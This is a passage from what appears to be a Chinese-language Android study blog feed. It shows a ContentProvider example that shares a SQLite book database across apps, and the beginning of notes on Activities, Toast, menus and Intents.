CATEGORY_DIT:</span><br><span class="line">                updatedRows = db.update(<span class="string">"Category"</span>, values, selection, selectionArgs);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGROY_ITEM:</span><br><span class="line">                String categoryId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                updatedRows = db.update(<span class="string">"Category"</span>, values, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;categoryId&#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> updatedRows;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        <span class="keyword">int</span> deletedRows = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span>(uriMatcher.match(uri))&#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                deletedRows = db.delete(<span class="string">"Book"</span>, selection, selectionArgs);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                String bookId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                deletedRows = db.delete(<span class="string">"Book"</span>, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;bookId&#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIT:</span><br><span class="line">                deletedRows = db.delete(<span class="string">"Category"</span>, selection, selectionArgs);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGROY_ITEM:</span><br><span class="line">                String categoryId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                deletedRows = db.delete(<span class="string">"Category"</span>, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;categoryId&#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deletedRows;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getType</span><span class="params">(Uri uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(uriMatcher.match(uri))&#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"vnd.android.cursor.dir/vnd.com.example.databasetest.provider.book"</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"vnd.android.cursor.item/vnd.com.example.databasetest.provider.book"</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"vnd.android.cursor.dir/vnd.com.example.databasetest.provider.category"</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGROY_ITEM:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"vnd.android.cursor.item/vnd.com.example.databasetest.provider.category"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在DatabaseTest这个项目就已经拥有了跨程序共享数据的功能了。</p>
<p>接着新建一个ProviderTest项目来访问数据：<br>修改布局：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/add"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"ADD"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/query"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"QUERY"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/update"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"UPDATE"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/delete"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"DELETE"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String newId;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button add = (Button) findViewById(R.id.add);</span><br><span class="line">        add.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Uri uri = Uri.parse(<span class="string">"content://com.example.databasetest.provider/book"</span>);</span><br><span class="line">                ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">                values.put(<span class="string">"name"</span>, <span class="string">"A Clash of Kings"</span>);</span><br><span class="line">                values.put(<span class="string">"author"</span>, <span class="string">"George Martin"</span>);</span><br><span class="line">                values.put(<span class="string">"pages"</span>, <span class="number">1040</span>);</span><br><span class="line">                values.put(<span class="string">"price"</span>, <span class="number">22.85</span>);</span><br><span class="line">                Uri newUri = getContentResolver().insert(uri, values);</span><br><span class="line">                newId = newUri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Button update = (Button) findViewById(R.id.update);</span><br><span class="line">        update.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Uri uri = Uri.parse(<span class="string">"content://com.example.databasetest.provider/book/"</span>+ newId);</span><br><span class="line">                ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">                values.put(<span class="string">"name"</span>, <span class="string">"A Storm of Swords"</span>);</span><br><span class="line">                values.put(<span class="string">"author"</span>, <span class="string">"George Raymond Richard Martin"</span>);</span><br><span class="line">                values.put(<span class="string">"pages"</span>, <span class="number">1216</span>);</span><br><span class="line">                values.put(<span class="string">"price"</span>, <span class="number">24.05</span>);</span><br><span class="line">                getContentResolver().update(uri, values, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Button query = (Button) findViewById(R.id.query);</span><br><span class="line">        query.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Uri uri = Uri.parse(<span class="string">"content://com.example.databasetest.provider/book"</span>);</span><br><span class="line">                Cursor cursor = getContentResolver().query(uri, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        String name = cursor.getString(cursor.getColumnIndex(<span class="string">"name"</span>));</span><br><span class="line">                        String author = cursor.getString(cursor.getColumnIndex(<span class="string">"author"</span>));</span><br><span class="line">                        <span class="keyword">int</span> pages = cursor.getInt(cursor.getColumnIndex(<span class="string">"pages"</span>));</span><br><span class="line">                        <span class="keyword">double</span> price = cursor.getDouble(cursor.getColumnIndex(<span class="string">"price"</span>));</span><br><span class="line">                        Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book name is "</span> + name);</span><br><span class="line">                        Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book author is "</span> + author);</span><br><span class="line">                        Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book pages is "</span> + pages);</span><br><span class="line">                        Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book price is "</span> + price);</span><br><span class="line">                    &#125; <span class="keyword">while</span> (cursor.moveToNext());</span><br><span class="line">                &#125;</span><br><span class="line">                cursor.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Button delete = (Button) findViewById(R.id.delete);</span><br><span class="line">        delete.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Uri uri = Uri.parse(<span class="string">"content://com.example.databasetest.provider/book/"</span>+newId);</span><br><span class="line">                getContentResolver().delete(uri, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样即可完成跨程序的内容提供器的创建与操作了。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Android权限分为2类：普通权限和危险权限。在Android6.0版及以上本引入了运行时权限，用户需要手动授予危险权限才能使用，并且一旦授权其对应权限组下其他权限也会被授权。</p>
<p>内容提供器提供了跨程序数据共享的功能，与数据库存储方式类似，可以使用增删改查四个功能，但其参数略有不同。</p>
<p>前文实践中在创建的内容提供器内部引入SQLite数据库的操作，并重写增删改查功能，以实现对外部程序共享数据的功能。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day2</title>
    <url>/2020/05/26/Android/Android-day2/</url>
    <content><![CDATA[<h1 id="探究活动"><a href="#探究活动" class="headerlink" title="探究活动"></a>探究活动</h1><h2 id="什么是活动"><a href="#什么是活动" class="headerlink" title="什么是活动"></a>什么是活动</h2><p>活动是一种可以包含用户界面的控件，主要用于和用户进行交互。一个应用程序中可以包含零个或多个活动。</p>
<h2 id="活动的基本用法"><a href="#活动的基本用法" class="headerlink" title="活动的基本用法"></a>活动的基本用法</h2><p>首先我们新建个项目ActivityTest来进行练习，模板选择的时候选择add no activity。</p>
<h3 id="手动创建活动"><a href="#手动创建活动" class="headerlink" title="手动创建活动"></a>手动创建活动</h3><p>右键点击com.example.activitytest包-&gt;New-&gt;Activity-&gt;Empty Activity。</p>
<p>取名FirstActivity，并且不要勾选Generate Layout File和Launcher Activity这两个选项。</p>
<h3 id="创建和加载布局"><a href="#创建和加载布局" class="headerlink" title="创建和加载布局"></a>创建和加载布局</h3><p>右击app/src/main/res目录-&gt;New-&gt;Directory，就会弹出一个新建目录窗口，这里创建一个名为layout的目录。然后对着layout目录右键-&gt;Layout resource file，又会弹出一个新建布局资源的窗口，我们将这个布局文件命名为first_layout，根元素就默认选择为LinearLayout，确认即可。</p>
<p>然后添加个按钮，修改代码为如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:id</span>=<span class="string">"@+id/button_1"</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:text</span>=<span class="string">"Button 1"</span></span></span><br><span class="line"><span class="tag">		/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中@+id/button_1表示添加一个button_1的id。随后layout_width指定了当前元素的宽度，layout_height指定当前元素的高度，android:text指定了元素中显示的文字内容。</p>
<p>重新回到FirstActivity，将onCreate()方法修改为如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.first_layout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="在AndroidManifest文件中注册"><a href="#在AndroidManifest文件中注册" class="headerlink" title="在AndroidManifest文件中注册"></a>在AndroidManifest文件中注册</h3><p>实际上Android Studio已经自动帮我们注册了：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".FirstActivity"</span>&gt;</span><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中.FirstActivity是com.example.activitytest.FirstActivity的缩写。因为外层的包已经指定了程序的包名是com.example.activitytest，所以可以直接使用这个缩写就行了。</p>
<p>另外，仅仅注册了活动，程序仍然是不能运行的，需要为程序配置主活动。即在activity标签内部加入<code>&lt;intent-filter&gt;</code>标签，并且加入<code>&lt;action android:name=&quot;android.intent.action.MAIN&quot;&gt;</code>和<code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;&gt;</code>这两句声明即可。</p>
<p>除此之外，还可以使用android:label指定活动中标题栏的内容。需注意的是，给主活动指定的label不仅会成为标题栏中的内容，还会成为启动器(Launcher)中应用程序显示的名称。</p>
<p>最终代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".FirstActivity"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">"This is FirstActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>另外，<strong>如果应用程序中没有声明任何一个活动作为主活动，这个程序仍然是可以正常安装的，只是无法在启动器中看到或者打开这个程序。</strong></p>
<h3 id="在活动中使用Toast"><a href="#在活动中使用Toast" class="headerlink" title="在活动中使用Toast"></a>在活动中使用Toast</h3><p>Toast是Android系统提供的一种非常好的提醒方式，在程序中可以使用它将一些短小的信息通知给用户，这些信息会在一段时间后自动消失，并且不会占用任何屏幕空间。</p>
<p>首先再onCreate()方法中添加如下代码，使我们再点击按钮的时候弹出一个Toast：（注意设置下自动导包）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button button1 = (Button) findViewById(R.id.button_1);</span><br><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(FirstActivity.<span class="keyword">this</span>, <span class="string">"You clicked me!"</span>,</span><br><span class="line">                Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>其中，findViewById()方法用来获取到在布局文件中定义的元素；它返回的是一个View对象。</p>
<p>onClickListener()方法用来为按钮注册一个监听器，点击按钮时就会执行监听器中的onClick()方法。</p>
<p>Toast用法非常简单，通过静态方法makeText()创建出一个Toast对象后，调用show()即可显示出来。</p>
<p>makeText()的第一个参数为Context，即Toast要求的上下文，由于活动本身就是一个Context对象，因此这里直接传入FirstActivity.this即可。第二个参数是显示的文本内容。第三个参数是Toast显示的时长，有两个内置常量可选择：Toast.LENGTH_SHORT和Toast.LENGTH_LONG。</p>
<p>完成上面的代码修改后编译安装即可。</p>
<h3 id="在活动中使用menu"><a href="#在活动中使用menu" class="headerlink" title="在活动中使用menu"></a>在活动中使用menu</h3><p>在res目录下新建一个menu文件夹，右击res目录-&gt;New-&gt;Directory，输入文件夹名menu，点击OK。接着再这个文件夹下新建一个main的菜单文件，右击文件夹-&gt;New-&gt;Menu resource file，文件名输入main，点击OK完成创建。</p>
<p>然后再main.xml文件中输入如下代码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;menu xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span><br><span class="line">	&lt;item</span><br><span class="line">		android:id=<span class="string">"@+id/add_item"</span></span><br><span class="line">		android:title=<span class="string">"Add"</span> /&gt;</span><br><span class="line">	&lt;item</span><br><span class="line">		android:id=<span class="string">"@+id/remove_item"</span></span><br><span class="line">        android:title=<span class="string">"Remove"</span> /&gt;</span><br><span class="line">&lt;/menu&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;item&gt;</code>标签就是用来创建某一个菜单项，然后通过android:id给这个菜单指定一个唯一的标识符，android:title给这个菜单项指定一个名称。</p>
<p>然后重新回到FirstActivity中来重写onCreateOptionsMenu()方法，可以用快捷键ctrl+O。然后编写如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">    getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过getMenuInflater()方法可以获得MenuInflater对象，再调用它的inflate()方法就可以给当前活动创建菜单。inflate()接收两个参数，第一个参数用于指定通过哪个资源文件创建菜单，第二个参数用于指定菜单项将添加到哪一个Menu对象中，这里直接用onCreateOptionsMenu()方法传入的参数menu。然后返回true表示允许创建的菜单显示出来，如果返回了false，创建的菜单将无法显示。</p>
<p>然后就是在FirstActivity中重写onOptionsItemSelected()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(item.getItemId())&#123;</span><br><span class="line">        <span class="keyword">case</span> R.id.add_item:</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"You clicked Add"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.remove_item:</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"You clicked Remove"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重新编译运行即可。</p>
<h3 id="销毁一个活动"><a href="#销毁一个活动" class="headerlink" title="销毁一个活动"></a>销毁一个活动</h3><p>Activity类提供了一个finish()方法用来销毁当前活动。</p>
<p>修改按钮监听器以销毁活动，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                        finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>

<p>这时点下按钮，当前的活动便会被销毁了。</p>
<h2 id="使用Intent在活动之间穿梭"><a href="#使用Intent在活动之间穿梭" class="headerlink" title="使用Intent在活动之间穿梭"></a>使用Intent在活动之间穿梭</h2><p>Intent是Android程序中各组件之间进行交互的一种重要方式，它不仅可以指明当前组件想要执行的动作，还可以在不同组件之间传递数据。Intent一般可被用于启动活动、启动服务以及发送广播等场景。</p>
<p>Intent大致可以分为两种：显示Intent和隐式Intent。</p>
<h3 id="使用显示Intent"><a href="#使用显示Intent" class="headerlink" title="使用显示Intent"></a>使用显示Intent</h3><p>首先创建一个空的Activity，命名为SecondActivity，并勾选Genrate Layout File，给布局文件起名为second_layout，但不要勾选Launcher Activity选项。</p>
<p>将second_layout.xml替换为如下内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/button_2"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Button 2"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后SecondActivity中保持不变即可。</p>
<p>Intent有多个构造函数的重载，其中一个是Intent(Context packageContext, Class&lt;?&gt;cls)。这个构造函数接收两个参数，第一个参数Context要求提供一个启动活动的上下文，第二个参数Class则是指定想要启动的目标活动，通过这个构造函数就可以构造出Intent的意图。Activity类中提供了一个startActivity()方法，这个方法是专门用于启动活动的，它接收一个Intent参数。</p>
<p>修改FirstActivity中的按钮点击事件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    Intent inten = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样按下按钮后就可以切换到SecondActivity了，如果要返回上一个活动的话按下Back键就可以销毁当前活动，从而回到上一个活动了。</p>
<h3 id="使用隐式Intent"><a href="#使用隐式Intent" class="headerlink" title="使用隐式Intent"></a>使用隐式Intent</h3><p>相比于显示Intent，隐式Intent不明确指出想要启动哪个活动，而是指定了一系列更为抽象的action和category等信息，然后交由系统去分析这个Intent，并找出合适的活动去启动。</p>
<p>通过在<code>&lt;activity&gt;</code>标签下配置<code>&lt;intent-filter&gt;</code>的内容，可以指定当前活动能够响应的action和category：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".SecondActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.activitytest.ACTION_START"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;action&gt;</code>标签中指定了当前活动可以响应com.example.activitytest.ACTION_START这个action，而<code>&lt;category&gt;</code>则包含了一些附加信息，更精确地指明了当前活动能够响应的Intent中还可能带有category。只有<code>&lt;action&gt;</code>和<code>&lt;category&gt;</code>的内容同时能够匹配上Intent中指定的action和category时，这个活动才能响应该Intent。</p>
<p>修改按钮点击事件如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.activitytest.ACTION_START"</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>因为设置了android.intent.category.DEFAULT，所以在调用startActivity()方法时会自动将这个category添加到Intent中。</p>
<p>可以通过修改如下代码来添加一个category：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.activitytest.ACTION_START"</span>);</span><br><span class="line">        intent.addCategory(<span class="string">"com.example.activitytest.MY_CATEGORY"</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

